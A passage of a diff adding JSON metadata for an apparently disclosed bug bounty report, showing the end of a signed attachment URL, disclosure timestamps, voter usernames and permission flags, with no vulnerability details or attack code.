YU9o%2BbWn8IagXyCYJqzQ5HYJsBQqHigRdSpnoeAouPMSgBBLeaHACyrmK6byVbmJG5QkJ0TGw7tzcZRDxz9bjoQZb28uNZssLNVTbMyTs%2Fq7f9tGKIBExQ%2FhxyMJPhnAtAMiQl17zYL7fccFIDuEgX7dC5fW7eB1TxoWwSJslOIxA489IoqShiWW4C5WuXegHr1FaomjDAlpXRBjqxAfNygmQNRaiF9INLKk%2BcaS23vonHOr%2BipIKetXJYgKYlwyteUD9ASHAAkVNvmlu336eV90VO4uqJ%2Bw%2Bz%2BtDFV0%2F%2F0qPHnIaKWAOURTj6HRhbxTUaFCP2pUoALzl5TeRDr66m%2FOIACNVbDSyl7kPiudyh%2BgJsDgknPntz20%2FDVLZ1nTO5GS84g%2FG%2F%2BNUkZR8rA7JGSTd9w%2FzCS0RSt7sjht10r4uVG7STKAs%2Bqrn6uWuXBQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=212c7bd9276da97d6dbd1fd7c41e600cfcc9b8cf3cec6ccec6c0fbaf0ca790cd",
+      "file_size": 53060,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2015-05-28T20:48:00.457Z",
+  "allow_singular_disclosure_after": -347990115.25624824,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "wargsec",
+    "jarvis0x1",
+    "shivammusic",
+    "n3dir0",
+    "destinedtohack"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
